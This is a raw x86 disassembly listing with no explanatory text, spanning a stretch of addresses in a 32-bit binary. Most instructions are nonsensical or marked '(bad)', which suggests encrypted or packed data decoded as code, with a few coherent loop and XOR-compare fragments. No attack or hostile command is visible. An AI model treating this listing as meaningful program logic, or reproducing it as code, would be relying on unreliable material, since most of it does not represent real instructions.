  40b509:	add    BYTE PTR [ebx],ah
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b52b
  40b514:	push   esi
  40b515:	dec    edx
  40b516:	retf   
  40b517:	mov    ah,0x61
  40b519:	mov    ecx,0xa00531cc
  40b51e:	xchg   edi,eax
  40b51f:	out    0x2a,al
  40b521:	xlat   BYTE PTR ds:[ebx]
  40b522:	popa   
  40b523:	sahf   
  40b524:	dec    edi
  40b525:	retf   0x21eb
  40b528:	(bad)  
  40b529:	xchg   BYTE PTR [ecx],dl
  40b52b:	xlat   BYTE PTR ds:[ebx]
  40b52c:	(bad)  
  40b52d:	mov    fs,WORD PTR [ecx]
  40b52f:	push   es
  40b530:	jg     0x40b4b3
  40b532:	jns    0x40b4e1
  40b534:	addr16 xor al,0xd8
  40b537:	rol    DWORD PTR [ecx],0x25
  40b53a:	mov    eax,ds:0x207a0477
  40b53f:	dec    eax
  40b540:	and    edx,ecx
  40b542:	sub    eax,0x954787e
  40b547:	(bad)  
  40b548:	cmp    DWORD PTR [edi+edx*1-0x42df39f3],edi
  40b54f:	lods   al,BYTE PTR ds:[esi]
  40b550:	or     al,0x93
  40b552:	out    0x66,eax
  40b554:	dec    edx
  40b555:	sahf   
  40b556:	in     al,dx
  40b557:	lods   eax,DWORD PTR ds:[esi]
  40b558:	mov    cl,0xd6
  40b55a:	xchg   edx,eax
  40b55b:	or     eax,0x9fc2470
  40b560:	test   DWORD PTR [esi],edx
  40b562:	and    DWORD PTR [edx],ebp
  40b564:	ficomp WORD PTR [edx+0x73]
  40b567:	test   al,0xc5
  40b569:	outs   dx,DWORD PTR ds:[esi]
  40b56a:	cmp    BYTE PTR gs:[edi],dl
  40b56d:	inc    esi
  40b56e:	stc    
  40b56f:	sbb    edx,DWORD PTR [eax+0x1ed87d5a]
  40b575:	add    DWORD PTR [eax],ebp
  40b577:	adc    al,0x6c
  40b579:	outs   dx,BYTE PTR ds:[esi]
  40b57a:	adc    bh,BYTE PTR [esi+0x5101e59d]
  40b580:	xor    cl,BYTE PTR [ecx+0xc]
  40b583:	dec    edx
  40b584:	test   ah,bh
  40b586:	pop    ebp
  40b587:	fld    DWORD PTR [edi+0x7919a123]
  40b58e:	jnp    0x40b517
  40b590:	mov    ebx,0xc1678371
  40b595:	in     eax,dx
  40b596:	push   cs
  40b597:	scas   eax,DWORD PTR es:[edi]
  40b598:	aad    0x9a
  40b59a:	test   DWORD PTR ds:0xf4c11f56,ecx
  40b5a0:	rcr    BYTE PTR [ebp+edi*8-0xf],0x86
  40b5a5:	or     eax,0x7ffaa7e7
  40b5aa:	cmp    eax,0x2f446403
  40b5af:	popa   
  40b5b0:	add    dl,dh
  40b5b2:	or     ah,al
  40b5b4:	lods   al,BYTE PTR ds:[esi]
  40b5b5:	addr16 add al,0x80
  40b5b9:	cdq    
  40b5ba:	mov    al,ds:0x34776254
  40b5bf:	xchg   esp,eax
  40b5c0:	addr16 fdiv st(1),st
  40b5c3:	loop   0x40b5a0
  40b5c5:	ins    DWORD PTR es:[edi],dx
  40b5c6:	fisubr DWORD PTR [edi]
  40b5c8:	adc    al,0xba
  40b5ca:	(bad)  
  40b5cb:	and    bh,BYTE PTR ds:0xfec55894
  40b5d1:	pusha  
  40b5d2:	inc    eax
  40b5d3:	jo     0x40b5e3
  40b5d5:	jg     0x40b62a
  40b5d7:	sbb    BYTE PTR [edi-0x442d17e0],0x7e
  40b5de:	cmp    ecx,eax
  40b5e0:	fsub   st(3),st
  40b5e2:	fisttp WORD PTR [eax]
  40b5e4:	fnstcw WORD PTR [ecx]
  40b5e6:	inc    ecx
  40b5e7:	push   edi
  40b5e8:	pop    ds
  40b5e9:	(bad)  [ebp-0x161c32c1]
  40b5ef:	xchg   edx,eax
  40b5f0:	data16 fld QWORD PTR fs:[ebx+0x766be2a6]
  40b5f8:	pusha  
  40b5f9:	imul   ebx,esp,0xffffffd8
  40b5fc:	xlat   BYTE PTR ds:[ebx]
  40b5fd:	xchg   edi,eax
  40b5fe:	adc    dh,BYTE PTR [edi+0xf]
  40b601:	pop    edi
  40b602:	(bad)  
  40b603:	scas   al,BYTE PTR es:[edi]
  40b604:	aad    0x3a
  40b606:	loop   0x40b65e
  40b608:	inc    ebx
  40b609:	imul   ebx,ebp,0x3c219ba2
  40b60f:	pop    eax
  40b610:	sar    BYTE PTR [edx-0x5bf3157],cl
  40b616:	test   eax,0x8db6adbb
  40b61b:	mov    es,WORD PTR [ebx-0x11]
  40b61e:	scas   al,BYTE PTR es:[edi]
  40b61f:	xor    dl,BYTE PTR ds:0x3ea7cebf
  40b625:	in     al,dx
  40b626:	(bad)  
  40b627:	pop    ss
  40b628:	xlat   BYTE PTR ds:[ebx]
  40b629:	dec    edx
  40b62a:	out    dx,al
  40b62b:	pop    ecx
  40b62c:	imul   esi,DWORD PTR [esp+ecx*4+0x2d679783],0x77
  40b634:	(bad)  
  40b635:	shl    edx,1
  40b637:	sbb    BYTE PTR [eax],0xff
  40b63a:	push   esi
  40b63b:	aam    0x76
  40b63d:	and    ah,BYTE PTR [edx+0x1bb81a70]
  40b643:	into   
  40b644:	mov    esi,0x95deb63f
  40b649:	scas   al,BYTE PTR es:[edi]
  40b64a:	pop    ebp
  40b64b:	jmp    0x40b670
  40b64d:	fsubr  DWORD PTR [ebx]
  40b64f:	inc    edi
  40b650:	iret   
  40b651:	sbb    BYTE PTR [esi+0x3a],ah
  40b654:	inc    esi
  40b655:	jg     0x40b6c9
  40b657:	jmp    0xcb6d83ff
  40b65c:	add    cl,BYTE PTR [eax+ecx*8]
  40b65f:	aaa    
  40b660:	aad    0xed
  40b662:	fldcw  WORD PTR [ecx+0x1f9108da]
  40b668:	adc    DWORD PTR ds:0x9a8bfbd2,edi
  40b66e:	mov    ecx,0x85037902
  40b673:	lock mov edx,0xa13ac50f
  40b679:	inc    edx
  40b67a:	pop    esi
  40b67b:	ins    BYTE PTR es:[edi],dx
  40b67c:	(bad)  
  40b67d:	xchg   esi,eax
  40b67e:	fsub   DWORD PTR [eax+edx*2+0x17ff0bd3]
  40b685:	push   ecx
  40b686:	or     DWORD PTR [ebx+eax*2-0x1e7aceb3],0x49
  40b68e:	jae    0x40b6bb
  40b690:	mov    ecx,esp
  40b692:	cwde   
  40b693:	scas   eax,DWORD PTR es:[edi]
  40b694:	imul   ecx,esi,0x57d889e8
  40b69a:	jl     0x40b710
  40b69c:	sbb    edi,DWORD PTR [edx-0x7fadb0d9]
  40b6a2:	(bad)  [ebp-0x5f]
  40b6a5:	sar    ch,cl
  40b6a7:	push   ebp
  40b6a8:	fdiv   QWORD PTR [eax-0x5b9ec0a9]
  40b6ae:	stc    
  40b6af:	not    ebp
  40b6b1:	and    DWORD PTR ds:0xcc1b9e13,esp
  40b6b7:	mov    ecx,0x190566ae
  40b6bc:	das    
  40b6bd:	repz cmp eax,0x20c17fd2
  40b6c3:	jb     0x40b6c7
  40b6c5:	push   es
  40b6c6:	lock add dl,BYTE PTR [ebp-0x453ecf54]
  40b6cd:	mov    edx,0x3bd21081
  40b6d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6d3:	into   
  40b6d4:	or     eax,0xe938ad3f
  40b6d9:	ds dec esi
  40b6db:	sbb    DWORD PTR [ebx],ebx
  40b6dd:	das    
  40b6de:	ss or  ah,dl
  40b6e1:	push   ss
  40b6e2:	pop    esp
  40b6e3:	ret    
  40b6e4:	out    dx,eax
  40b6e5:	cmp    DWORD PTR ds:0xfe194132,edi
  40b6eb:	push   ds
  40b6ec:	mov    esp,0x1e773576
  40b6f1:	lods   al,BYTE PTR ds:[esi]
  40b6f2:	sbb    al,0x4d
  40b6f4:	pop    ebp
  40b6f5:	xlat   BYTE PTR ds:[ebx]
  40b6f6:	xchg   ebx,eax
  40b6f7:	inc    edx
  40b6f8:	push   esi
  40b6f9:	cli    
  40b6fa:	or     al,0xba
  40b6fc:	xchg   esi,eax
  40b6fd:	cmp    BYTE PTR [esi+0x6a0d985d],dh
  40b703:	mov    cl,0x24
  40b705:	push   0xffffffe8
  40b707:	ret    0xfe9f
  40b70a:	push   edi
  40b70b:	and    DWORD PTR [eax],edi
  40b70d:	push   ebx
  40b70e:	xchg   esp,eax
  40b70f:	test   DWORD PTR [eax],0x71f6489
  40b715:	(bad)  
  40b716:	adc    al,0x9b
  40b718:	or     bl,ch
  40b71a:	jno    0x40b797
  40b71c:	mov    bh,0xcd
  40b71e:	mov    al,0x7c
  40b720:	dec    esp
  40b721:	sbb    cl,BYTE PTR [ecx+0x65]
  40b724:	scas   al,BYTE PTR es:[edi]
  40b725:	pop    esp
  40b726:	cmp    DWORD PTR [edx],ecx
  40b728:	and    DWORD PTR [ebx],esi
  40b72a:	stos   DWORD PTR es:[edi],eax
  40b72b:	add    BYTE PTR [ebp-0x1692780f],ah
  40b731:	aam    0x5c
  40b733:	jecxz  0x40b7a2
  40b735:	inc    edx
  40b736:	ins    DWORD PTR es:[edi],dx
  40b737:	xchg   ebx,eax
  40b739:	out    dx,al
  40b73a:	stos   DWORD PTR es:[edi],eax
  40b73b:	push   0xfffffffc
  40b73d:	out    0x6c,al
  40b73f:	mov    ss,ecx
  40b741:	scas   eax,DWORD PTR es:[edi]
  40b742:	jne    0x40b757
  40b744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b745:	lds    edi,FWORD PTR [ebx]
  40b747:	adc    DWORD PTR [eax],0x7612a5bd
  40b74d:	fstp   QWORD PTR [eax+0x64]
  40b750:	pop    edi
  40b751:	test   DWORD PTR [ebx+0xf],ebx
  40b754:	ins    DWORD PTR es:[edi],dx
  40b755:	in     eax,0xc2
  40b757:	jno    0x40b70a
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	int    0xee
  40b78c:	in     eax,0x61
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	mov    bl,0x80
  40b798:	(bad)  
  40b799:	in     eax,dx
  40b79a:	aaa    
  40b79b:	or     DWORD PTR [eax-0x14952fc9],ebx
  40b7a1:	addr16 inc eax
  40b7a3:	gs jnp 0x40b759
  40b7a6:	pop    eax
  40b7a7:	sub    BYTE PTR [esi],0x7e
  40b7aa:	imul   ebp,ebp,0xb284dbac
  40b7b0:	mov    cl,0x25
  40b7b2:	or     al,bl
  40b7b4:	jbe    0x40b7d9
  40b7b6:	retf   0x367f
  40b7b9:	fwait
  40b7ba:	jbe    0x40b787
  40b7bc:	sub    edi,DWORD PTR [esi+0x60]
  40b7bf:	jno    0x40b754
  40b7c1:	call   0xd955a559
  40b7c6:	rcl    dh,0x7e
  40b7c9:	ins    DWORD PTR es:[edi],dx
  40b7ca:	dec    ecx
  40b7cb:	dec    edx
  40b7cc:	lods   al,BYTE PTR ds:[esi]
  40b7cd:	dec    eax
  40b7ce:	pop    edx
  40b7cf:	sbb    ecx,ebx
  40b7d1:	mov    dh,0x1b
  40b7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7d4:	cs es loop 0x40b7e0
  40b7d8:	mov    dh,0x64
  40b7da:	jmp    0x389487c1
  40b7df:	cbw    
  40b7e1:	add    cl,BYTE PTR gs:[eax+edx*4-0x4d]
  40b7e6:	out    0x1d,al
  40b7e8:	push   ss
  40b7e9:	jae    0x40b83d
  40b7eb:	jne    0x40b829
  40b7ed:	retf   
  40b7ee:	scas   eax,DWORD PTR es:[edi]
  40b7ef:	loopne 0x40b793
  40b7f1:	pop    es
  40b7f2:	fldz   
  40b7f4:	(bad)  
  40b7f5:	xor    ebp,edx
  40b7f7:	dec    eax
  40b7f8:	das    
  40b7f9:	out    dx,al
  40b7fa:	cmp    DWORD PTR [ebx-0x7d61099b],ebp
  40b800:	dec    ebx
  40b801:	(bad)  
  40b802:	std    
  40b803:	adc    BYTE PTR [ebp+0x20],cl
  40b806:	xor    ch,ch
  40b808:	data16 stos BYTE PTR es:[edi],al
  40b80a:	jl     0x40b79a
  40b80c:	xchg   ebp,eax
  40b80d:	mov    DWORD PTR [edi-0x79b9539a],eax
  40b813:	mov    dl,0x77
  40b815:	js     0x40b80a
  40b817:	sub    eax,0x860e4e8e
  40b81c:	fistp  QWORD PTR [ebp+ebx*2-0x3d]
  40b820:	jmp    0x40b86c
  40b822:	nop
  40b823:	and    edi,DWORD PTR [ebx+0x61]
  40b826:	jp     0x40b814
  40b828:	repnz jmp FWORD PTR [eax-0x44c6fa11]
  40b82f:	retf   0x9bfb
  40b832:	mov    ch,0x38
  40b834:	or     al,0xea
  40b836:	ss inc eax
  40b838:	adc    al,0xc6
  40b83a:	shl    DWORD PTR [esi+0x5acedb1f],0x5c
  40b841:	fld    TBYTE PTR ds:0x586a582d
  40b847:	bound  ebp,QWORD PTR [ebp-0x41]
  40b84a:	stos   DWORD PTR es:[edi],eax
  40b84b:	test   BYTE PTR [edx-0x30],dl
  40b84e:	pop    ebp
  40b84f:	mov    ah,0x21
  40b851:	dec    eax
  40b852:	out    0xe5,eax
  40b854:	jae    0x40b86c
  40b856:	pop    esp
  40b857:	inc    ebp
  40b858:	mov    ebx,0xfd629459
  40b85d:	call   ebx
  40b85f:	inc    ebx
  40b860:	in     al,dx
  40b861:	cdq    
  40b862:	sbb    dl,al
  40b864:	repz push ebp
  40b866:	js     0x40b8cf
  40b868:	or     al,0xc5
  40b86a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b86b:	pop    ecx
  40b86c:	fcom   QWORD PTR [edx-0x25cebfbf]
  40b872:	xchg   ecx,eax
  40b873:	out    dx,al
  40b874:	ret    0x8003
  40b877:	mov    bh,0x7d
  40b879:	lods   eax,DWORD PTR ds:[esi]
  40b87a:	pop    esi
  40b87b:	mov    esp,0x33bb6b25
  40b880:	cmc    
  40b881:	out    0x31,eax
  40b883:	pop    es
  40b884:	retf   0x3b4e
  40b887:	mov    dl,0xb9
  40b889:	clc    
  40b88a:	ins    DWORD PTR es:[edi],dx
  40b88b:	out    0x2b,eax
  40b88d:	stc    
  40b88e:	popa   
  40b88f:	popf   
  40b890:	mov    WORD PTR [ecx+ecx*2],ss
  40b893:	inc    edi
  40b894:	repnz imul ecx,ecx,0x2
  40b898:	xchg   esp,eax
  40b899:	xor    dh,BYTE PTR [ebx+0x286ddd15]
  40b89f:	mov    dh,0x8
  40b8a1:	test   al,0xbb
  40b8a3:	pop    esp
  40b8a4:	pusha  
  40b8a5:	jmp    0x40b891
  40b8a7:	ss nop
  40b8a9:	lock or eax,0x98478465
  40b8af:	xor    eax,0x374cbb3b
  40b8b4:	shl    DWORD PTR [eax+0x6a17dbeb],1
  40b8ba:	push   edx
  40b8bb:	xchg   ebp,eax
  40b8bc:	pop    ss
  40b8bd:	daa    
  40b8be:	addr16 mov dh,0x6b
  40b8c1:	jp     0x40b85e
  40b8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8c4:	int3   
  40b8c5:	mov    bh,0xe
  40b8c7:	div    DWORD PTR [ebp+0x23463bf3]
  40b8cd:	jl     0x40b922
  40b8cf:	les    ebx,FWORD PTR [ebx-0x22]
  40b8d2:	xor    ah,bh
  40b8d4:	mov    ebp,0x9b6c06ee
  40b8d9:	outs   dx,BYTE PTR ds:[esi]
  40b8da:	xor    al,0x79
  40b8dc:	pop    ebp
  40b8dd:	scas   eax,DWORD PTR es:[edi]
  40b8de:	mov    esi,0x45fc7166
  40b8e3:	shl    BYTE PTR [ecx+0x98fee4c],1
  40b8e9:	loope  0x40b8b3
  40b8eb:	push   ds
  40b8ec:	xor    esp,DWORD PTR [edi-0x13]
  40b8ef:	fst    DWORD PTR [esi-0x461787ab]
  40b8f5:	rcl    DWORD PTR [eax+0x7f0c33fe],cl
  40b8fb:	sbb    eax,0x1568a6a9
  40b900:	mov    ds:0xe3bf959f,eax
  40b905:	fcmovne st,st(0)
  40b907:	mov    ds:0xe32e2d85,al
  40b90c:	fsubp  st(3),st
  40b90e:	jge    0x40b8b5
  40b910:	(bad)  
  40b911:	dec    edi
  40b912:	push   ecx
  40b913:	mov    bh,0x8f
  40b915:	or     al,0x35
  40b917:	fiadd  DWORD PTR [ebx+ebp*4-0x21a78f87]
  40b91e:	mov    ds:0x40b2f8ee,eax
  40b923:	jns    0x40b8b1
  40b925:	aad    0x29
  40b927:	outs   dx,DWORD PTR ds:[esi]
  40b928:	sar    BYTE PTR [edx],cl
  40b92a:	adc    ah,BYTE PTR [edi-0x1e86271f]
  40b930:	int    0xdb
  40b932:	sub    al,0x8
  40b934:	sub    BYTE PTR [edx-0x19e6c6ad],dl
  40b93a:	jp     0x40b977
  40b93c:	xor    DWORD PTR [edi],0xffffffaf
  40b93f:	adc    dh,bl
  40b941:	pop    ds
  40b942:	jne    0x40b8e4
  40b944:	popf   
  40b945:	mov    esp,0xc7433930
  40b94a:	vmptrst QWORD PTR ds:0x8bf2c1ac
  40b951:	out    0xe,al
  40b953:	hlt    
  40b954:	jecxz  0x40b92f
  40b956:	cmp    eax,0xb63fcf9d
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	and    al,BYTE PTR [eax+0x38]
  40b95f:	push   0xf
  40b961:	call   0x80e53630
  40b966:	test   DWORD PTR [ebp-0x13],eax
  40b969:	(bad)  
  40b96a:	or     ecx,ebp
  40b96c:	inc    edi
  40b96d:	or     edi,ebp
  40b96f:	mov    ch,BYTE PTR ds:0xaaec549a
  40b975:	inc    eax
  40b976:	in     eax,0x3a
  40b978:	popf   
  40b979:	pop    ss
  40b97a:	sbb    edi,ebx
  40b97c:	lods   al,BYTE PTR ds:[esi]
  40b97d:	into   
  40b97e:	arpl   WORD PTR [eax],ax
  40b980:	repnz fnstenv [eax-0x4835206c]
  40b987:	fs xor al,0xe5
  40b98a:	clc    
  40b98b:	inc    ebp
  40b98c:	sub    ebp,ebp
  40b98e:	pop    ds
  40b98f:	int3   
  40b990:	or     eax,DWORD PTR [edi]
  40b992:	fstp   TBYTE PTR [esi-0x50]
  40b995:	popa   
  40b996:	jge    0x40b9d7
  40b998:	pop    edi
  40b999:	and    bl,ah
  40b99b:	and    al,BYTE PTR [ebx]
  40b99d:	and    bl,ah
  40b99f:	add    ebp,DWORD PTR [edx-0x62]
  40b9a2:	pop    ebx
  40b9a3:	cmp    ebp,DWORD PTR [esp+eax*8+0x1d]
  40b9a7:	aad    0xce
  40b9a9:	and    al,0x75
  40b9ab:	jne    0x40ba1e
  40b9ad:	jnp    0x40b993
  40b9af:	stos   BYTE PTR es:[edi],al
  40b9b0:	pop    es
  40b9b1:	cdq    
  40b9b2:	add    DWORD PTR [eax],0x81fffee
  40b9b8:	fwait
  40b9b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9ba:	push   ecx
  40b9bb:	push   ds
  40b9bc:	jp     0x40b942
  40b9be:	sbb    cl,BYTE PTR [ebp-0x2176c06a]
  40b9c4:	xlat   BYTE PTR ds:[ebx]
  40b9c5:	outs   dx,BYTE PTR ds:[esi]
  40b9c6:	js     0x40ba28
  40b9c8:	jno    0x40ba3e
  40b9ca:	push   ebp
  40b9cb:	pop    ebx
  40b9cc:	dec    ebp
  40b9cd:	jg     0x40ba26
  40b9cf:	test   eax,0x2e9f3baf
  40b9d4:	scas   eax,DWORD PTR es:[edi]
  40b9d5:	jmp    0x7166:0x413580c2
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x1ed1a808],eax
  40ba0f:	bound  edi,QWORD PTR [esp+edi*2+0x387e7efd]
  40ba16:	jl     0x40ba96
  40ba18:	jle    0x40ba3a
  40ba1a:	aaa    
  40ba1b:	clc    
  40ba1c:	aad    0x86
  40ba1e:	mov    esi,0x8ab9d429
  40ba23:	jmp    0xeb99924f
  40ba28:	icebp  
  40ba29:	jns    0x40ba6a
  40ba2b:	pop    edi
  40ba2c:	test   edx,edx
  40ba2e:	inc    edx
  40ba2f:	mov    ebx,DWORD PTR [ebp-0x65]
  40ba32:	stos   DWORD PTR es:[edi],eax
  40ba33:	mov    bl,0xfb
  40ba35:	out    0x40,al
  40ba37:	cmp    esi,DWORD PTR [ecx+0xb636c1d]
  40ba3d:	mov    al,ds:0x3096df8e
  40ba42:	add    BYTE PTR [ecx],0x7e
  40ba45:	pop    ds
  40ba46:	(bad)  
  40ba47:	in     eax,dx
  40ba48:	and    eax,DWORD PTR [ecx+0x5e]
  40ba4b:	jp     0x40ba05
  40ba4d:	shl    DWORD PTR [edi+0x77922704],0x7c
  40ba54:	rol    BYTE PTR [eax+0x1bbb09e6],1
  40ba5a:	dec    edi
  40ba5b:	cmp    al,0x97
  40ba5d:	les    edx,FWORD PTR ds:0xbb1acfd9
  40ba63:	jecxz  0x40bad4
  40ba65:	inc    edi
  40ba66:	ficomp DWORD PTR [eax+0xea062dd]
  40ba6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba6d:	cdq    
  40ba6e:	fisub  WORD PTR [ebx+ebx*2-0x6b]
  40ba72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba73:	push   ss
  40ba74:	call   0xd769:0x1f9b5cc9
  40ba7b:	mov    ds:0xc85bd46e,al
  40ba80:	std    
  40ba81:	push   cs
  40ba82:	movhps xmm3,QWORD PTR [esi+0x17]
  40ba86:	sbb    BYTE PTR [ecx+ebx*8],cl
  40ba89:	jmp    0x40ba5b
  40ba8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba8c:	mov    al,ds:0xc149e6d1
  40ba91:	neg    BYTE PTR [ecx+0x188c887a]
  40ba97:	iret   
  40ba98:	pop    ecx
  40ba99:	cmp    al,0xe2
  40ba9b:	jne    0x40ba9c
  40ba9d:	mov    ebx,0xf1c5a22e
  40baa2:	stos   BYTE PTR es:[edi],al
  40baa3:	jnp    0x40ba5a
  40baa5:	adc    esp,DWORD PTR [ebp+0x7f]
  40baa8:	aam    0x1f
  40baaa:	pop    ds
  40baab:	cmp    ah,BYTE PTR [ebp+ebx*1+0x3a]
  40baaf:	(bad)  
  40bab0:	jnp    0x40ba8e
  40bab2:	jmp    0xe06b4276
  40bab7:	or     al,0xf2
  40bab9:	dec    ecx
  40baba:	dec    ebx
  40babb:	push   esp
  40babc:	inc    esp
  40babd:	mov    ebx,0x9c390b39
  40bac2:	add    ah,BYTE PTR [ecx]
  40bac4:	lahf   
  40bac5:	jns    0x40ba88
  40bac7:	lahf   
  40bac8:	cmp    BYTE PTR [ecx-0x416779bb],ah
  40bace:	adc    eax,0x58ad5762
  40bad3:	cwde   
  40bad4:	pop    ds
  40bad5:	mov    bh,0x1f
  40bad7:	push   ebp
  40bad8:	cmp    ch,al
  40bada:	aad    0x61
  40badc:	mov    BYTE PTR [edi-0x54],0xcf
  40bae0:	scas   eax,DWORD PTR es:[edi]
  40bae1:	pop    es
  40bae2:	jae    0x40bb14
  40bae4:	(bad)  
  40bae5:	xor    al,0x17
  40bae7:	jne    0x40ba85
  40bae9:	ss or  esp,ebx
  40baec:	inc    ch
  40baee:	scas   eax,DWORD PTR es:[edi]
  40baef:	scas   al,BYTE PTR es:[edi]
  40baf0:	sbb    dh,BYTE PTR [edx]
  40baf2:	jmp    0xcb26:0xc8bd2f18
  40baf9:	xchg   dh,al
  40bafb:	fs inc edx
  40bafd:	pop    ecx
  40bafe:	pop    ebx
  40baff:	jecxz  0x40bb19
  40bb01:	rcl    DWORD PTR [eax-0x676c05a],cl
  40bb07:	cli    
  40bb08:	sbb    al,0xe5
  40bb0a:	inc    edi
  40bb0b:	lock lds edx,FWORD PTR ss:[edi]
  40bb0f:	mov    ds:0x84a5a777,eax
  40bb14:	inc    esp
  40bb15:	cwde   
  40bb16:	xchg   esi,eax
  40bb17:	jbe    0x40bb06
  40bb19:	mov    WORD PTR [ecx+0x319e2934],es
  40bb1f:	xchg   edi,eax
  40bb20:	fdivr  st(0),st
  40bb22:	int    0x3
  40bb24:	retf   
  40bb25:	sar    DWORD PTR [esi],1
  40bb27:	adc    BYTE PTR [edi+esi*8],dh
  40bb2a:	scas   eax,DWORD PTR es:[edi]
  40bb2b:	retf   
  40bb2c:	popf   
  40bb2d:	add    BYTE PTR ds:0x69905244,ah
  40bb33:	enter  0x3d55,0x99
  40bb37:	xchg   ebp,eax
  40bb38:	adc    ecx,edi
  40bb3a:	cmp    al,0x48
  40bb3c:	sbb    DWORD PTR [esi],esp
  40bb3e:	adc    al,0x86
  40bb40:	out    0x55,eax
  40bb42:	vpmacssdqh ymm6,ymm4,YMMWORD PTR [edx+0x1ed267dd],ymm0
  40bb4c:	push   0x1b59ad62
  40bb51:	out    dx,eax
  40bb52:	shr    BYTE PTR [edi-0x27],cl
  40bb55:	int3   
  40bb56:	push   edx
  40bb57:	add    al,0x76
  40bb59:	ins    DWORD PTR es:[edi],dx
  40bb5a:	data16 cmp al,0xf3
  40bb5d:	gs fptan 
  40bb60:	add    bl,BYTE PTR [ebx]
  40bb62:	sbb    BYTE PTR [ebx-0x48],bl
  40bb65:	jae    0x40bb44
  40bb67:	into   
  40bb68:	pop    esp
  40bb69:	loope  0x40bba0
  40bb6b:	mov    bl,BYTE PTR [esp+ecx*8-0x75e8d6b2]
  40bb72:	push   ds
  40bb73:	out    0xd5,eax
  40bb75:	scas   al,BYTE PTR es:[edi]
  40bb76:	scas   eax,DWORD PTR es:[edi]
  40bb77:	iret   
  40bb78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb79:	aas    
  40bb7a:	ror    eax,0xdf
  40bb7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb7e:	not    BYTE PTR [edx+ecx*4+0x75]
  40bb82:	inc    ebx
  40bb83:	mov    ds:0xc2bdd572,eax
  40bb88:	stos   DWORD PTR es:[edi],eax
  40bb89:	inc    ebp
  40bb8a:	pop    ebp
  40bb8b:	popa   
  40bb8c:	shl    BYTE PTR [edi],cl
  40bb8e:	adc    DWORD PTR [ebp+eiz*8-0x4e744193],edi
  40bb95:	xchg   ebp,eax
  40bb96:	lods   eax,DWORD PTR ds:[esi]
  40bb97:	jg     0x40bc0d
  40bb99:	sbb    al,0x22
  40bb9b:	stos   DWORD PTR es:[edi],eax
  40bb9c:	sbb    BYTE PTR ds:0xca4a40bf,bh
  40bba2:	test   DWORD PTR ds:0xa3f38170,esp
  40bba8:	jl     0x40bb30
  40bbaa:	aam    0xc2
  40bbac:	lock sbb esi,ecx
  40bbaf:	(bad)  
  40bbb0:	mov    ebp,0xb9a10ff5
  40bbb5:	adc    al,0x9d
  40bbb7:	lods   eax,DWORD PTR ds:[esi]
  40bbb8:	push   0x76f15818
  40bbbd:	mov    esp,0xbabd171b
  40bbc2:	xor    BYTE PTR [ecx+0x1237510a],0xf7
  40bbc9:	cmp    ebp,DWORD PTR fs:[ebp-0x56]
  40bbcd:	ret    0xc7a8
  40bbd0:	cmp    eax,0xc439ed01
  40bbd5:	push   ebp
  40bbd6:	(bad)  [eax+0x315da88]
  40bbdc:	mov    eax,0x5c6365e5
  40bbe1:	mov    ah,0x47
  40bbe3:	je     0x40bc21
  40bbe5:	retf   
  40bbe6:	sbb    DWORD PTR [ebp+0x7acb1096],edi
  40bbec:	sub    esp,edi
  40bbee:	mov    esi,0x8f963eef
  40bbf3:	js     0x40bc32
  40bbf5:	jp     0x40bc4c
  40bbf7:	push   cs
  40bbf8:	or     DWORD PTR [edi+0x521e1cc6],ebx
  40bbfe:	or     eax,0x1b2c8572
  40bc03:	dec    edx
  40bc04:	jne    0x40bbb4
  40bc06:	mov    WORD PTR [edx+0x22e08f62],ds
  40bc0c:	sbb    BYTE PTR [ebp+edx*8+0x4b],dh
  40bc10:	shr    DWORD PTR [edx],cl
  40bc12:	aas    
  40bc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc14:	sbb    edx,DWORD PTR [ebx+0x2b51c83f]
  40bc1a:	cmp    DWORD PTR [eax],esi
  40bc1c:	test   eax,0x92bdbcd4
  40bc21:	sbb    dh,BYTE PTR [ebx+0x5a5f89a9]
  40bc27:	sbb    BYTE PTR [eax],ah
  40bc29:	es iret 
  40bc2b:	xchg   BYTE PTR [ecx],dh
  40bc2d:	(bad)  
  40bc2f:	outs   dx,BYTE PTR ds:[esi]
  40bc30:	test   al,0x58
  40bc32:	fwait
  40bc33:	mov    ah,0xb5
  40bc35:	mov    edi,0xe5af47c5
  40bc3a:	gs jnp 0x40bc61
  40bc3d:	call   0x266e:0x62b6dc76
  40bc44:	mov    eax,ds:0xb0b910eb
